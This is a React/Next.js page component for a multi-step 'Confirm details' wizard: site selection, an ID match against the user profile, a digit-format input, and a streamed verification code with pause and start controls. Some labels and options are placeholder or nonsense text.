'use client';
import Image from 'next/image';
import UserNav from '@/components/UserNav';
import React, { useEffect, useRef, useState } from 'react';

const OPTIONS = ['кокз 1','кокз 2','кокз 3','кокоз 4','кокоз 5','кокоз 6','кокоз 7','кокоз 8','кокоз 9','кокоз 10','кокоз 11'];

type Profile = { nameOnSite?: string; idOnSite?: string; residence?: string; photoUrl?: string; };

export default function ConfirmPage(){
  const [step,setStep] = useState(1);
  const [site,setSite] = useState<string>('');
  const [nameOnSite,setName] = useState('');
  const [idOnSite,setId] = useState('');
  const [residence,setRes] = useState('');
  const [matches,setMatches] = useState(false);
  const [profile,setProfile] = useState<Profile|undefined>(undefined);
  const [cubes,setCubes] = useState<number|undefined>(undefined);
  const [method,setMethod] = useState('');
  const [codeChars,setCodeChars] = useState<string>('');
  const [showPauseNote,setShowPauseNote] = useState(false);
  const [expired,setExpired] = useState(false);

  const evtRef = useRef<EventSource|null>(null);
  const codeBoxRef = useRef<HTMLDivElement|null>(null);
  useEffect(()=>()=>{ if(evtRef.current) evtRef.current.close(); },[]);
  useEffect(()=>{ if(codeBoxRef.current) codeBoxRef.current.scrollTop = codeBoxRef.current.scrollHeight; },[codeChars]);

  async function checkMatch(){
    const res = await fetch('/me.json');
    const me = await res.json();
    const u = me?.user;
    const p: Profile = u?.profile || {};
    // Сверяем ТОЛЬКО ID
    const ok = (p.idOnSite||'') === idOnSite.trim();
    setMatches(ok);
    setProfile(p);
    setStep(3);
  }

  function startStream(){
    setExpired(false);
    setCodeChars('');
    if(evtRef.current) evtRef.current.close();
    const es = new EventSource('/api/code-stream');
    evtRef.current = es;
    es.onmessage = (e)=>{
      try{
        const data = JSON.parse(e.data);
        if(data.type === 'char'){ setCodeChars(prev=>prev + String(data.value||'')); }
        if(data.type === 'expired'){ setExpired(true); es.close(); }
      }catch{
        if(typeof e.data === 'string' && e.data.length === 1) setCodeChars(prev=>prev + e.data);
      }
    };
    es.onerror = ()=>{ es.close(); };
  }

  async function doPause(){
    await fetch('/api/code-stream/control', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ action:'pause' })
    });
    setShowPauseNote(true);
    setTimeout(()=>setShowPauseNote(false), 3000);
  }
  async function doStart(){
    await fetch('/api/code-stream/control', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ action:'start' })
    });
  }

  return (
    <div style={{minHeight:'100vh', backgroundImage:'url(/images/Background_2.webp)', backgroundSize:'cover', backgroundPosition:'center'}}>
      <UserNav/>
      <div className="centered" style={{flexDirection:'column', gap:16}}>
        <Image src="/images/Logo_2.webp" alt="logo" width={120} height={120} style={{borderRadius:'999px', boxShadow:'0 10px 30px rgba(0,0,0,.2)'}} />
        <div className="card" style={{width:820, maxWidth:'95%'}}>
          <div className="title">Confirm details</div>

          {step===1 && (
            <div className="stack">
              <label>The name of the website where you communicated and conducted transactions</label>
              <select className="input" value={site} onChange={e=>setSite(e.target.value)}>
                <option value="">Select...</option>
                {OPTIONS.map(o=><option key={o} value={o}>{o}</option>)}
              </select>
              <div className="muted">Если вы не нашли подходящий вариант обратитесь в поддержку.</div>
              <div style={{display:'flex',gap:8}}>
                <a className="btn" href="/chat">Open support chat</a>
                <button className="btn btn-primary" disabled={!site} onClick={()=>setStep(2)}>Next</button>
                <a className="btn" href="/dashboard">Back</a>
              </div>
            </div>
          )}

          {step===2 && (
            <div className="stack">
              <input className="input" placeholder="Your name on the website" value={nameOnSite} onChange={e=>setName(e.target.value)} />
              <input className="input" placeholder="Your ID on the website" value={idOnSite} onChange={e=>setId(e.target.value)} />
              <input className="input" placeholder="Place of residence indicated on the website" value={residence} onChange={e=>setRes(e.target.value)} />
              <div className="muted" style={{marginTop:6}}>
                The panda rabbit crocodile, di di di, eats candy, and could eat shashlik, but the elephant didn't come
              </div>
              <div style={{display:'flex',gap:8}}>
                <button className="btn btn-primary" onClick={checkMatch}>Next</button>
                <button className="btn" onClick={()=>setStep(1)}>Back</button>
              </div>
            </div>
          )}

          {step===3 && (
            <div className="stack">
              {matches ? (
                <div className="panel">
                  <div className="grid cols-2" style={{alignItems:'center'}}>
                    <div>
                      <div className="muted">Your name on the website</div>
                      <div>{profile?.nameOnSite}</div>
                      <div className="muted" style={{marginTop:8}}>Your ID on the website</div>
                      <div>{profile?.idOnSite}</div>
                      <div className="muted" style={{marginTop:8}}>Place of residence indicated on the website</div>
                      <div>{profile?.residence}</div>
                    </div>
                    <div>
                      {profile?.photoUrl ? (
                        <img
                          src={profile.photoUrl}
                          alt="photo"
                          style={{
                            width: '160px',
                            height: '160px',
                            borderRadius: '50%',
                            objectFit: 'cover',
                            border: '3px solid #fff',
                            boxShadow: '0 0 10px rgba(0,0,0,0.2)'
                          }}
                        />
                      ) : null}
                    </div>
                  </div>
                  <div style={{display:'flex',gap:8, marginTop:12}}>
                    <button className="btn btn-primary" onClick={()=>setStep(4)}>Confirm and continue</button>
                    <button className="btn" onClick={()=>setStep(2)}>Back</button>
                  </div>
                </div>
              ) : (
                <div className="panel">
                  The entered data does not match. Please contact support.
                  <div style={{marginTop:12}}>
                    <a className="btn" href="/chat">Open support chat</a>
                    <button className="btn" onClick={()=>setStep(2)} style={{marginLeft:8}}>Back</button>
                  </div>
                </div>
              )}
            </div>
          )}

          {step===4 && (
            <div className="stack">
              <label>How many cubes did you use?</label>
              <input className="input" type="number" value={cubes ?? ''} onChange={e=>setCubes(parseInt(e.target.value||'0'))} />
              <div className="muted">*please indicate the approximate quantity</div>
              <div style={{display:'flex',gap:8}}>
                <button className="btn btn-primary" onClick={()=>setStep(5)}>Next</button>
                <button className="btn" onClick={()=>setStep(3)}>Back</button>
              </div>
            </div>
          )}

          {step===5 && (
            <div className="stack">
              <label>Enter the first four digits of the method and the last digits of the destination in the format ****-****</label>
              <input className="input" placeholder="1234-1234" value={method} onChange={e=>setMethod(e.target.value)} />
              <div style={{display:'flex',gap:8}}>
                <button className="btn btn-primary" disabled={!/^\d{4}-\d{4}$/.test(method)} onClick={()=>setStep(6)}>Next</button>
                <button className="btn" onClick={()=>setStep(4)}>Back</button>
              </div>
            </div>
          )}

          {step===6 && (
            <div className="stack">
              <div style={{display:'flex',gap:8, flexWrap:'wrap'}}>
                <button className="btn btn-primary" onClick={startStream}>Generate code</button>
                <button className="btn" onClick={doPause}>Pause</button>
                <button className="btn" onClick={doStart}>Start</button>
                <button className="btn" onClick={()=>setStep(5)}>Back</button>
              </div>

              <div ref={codeBoxRef} className="chatbox" style={{whiteSpace:'pre-wrap', maxHeight:220, overflowY:'auto'}}>
                {expired ? 'Code expired' : (codeChars || 'Waiting for code...')}
              </div>

              {showPauseNote && (
                <div className="panel" style={{background:'#fffbeb', borderColor:'#fcd34d'}}>
                  The pause is set for a maximum of 32 hours, after which the code will become invalid
                </div>
              )}
            </div>
          )}

        </div>
      </div>
    </div>
  );
}
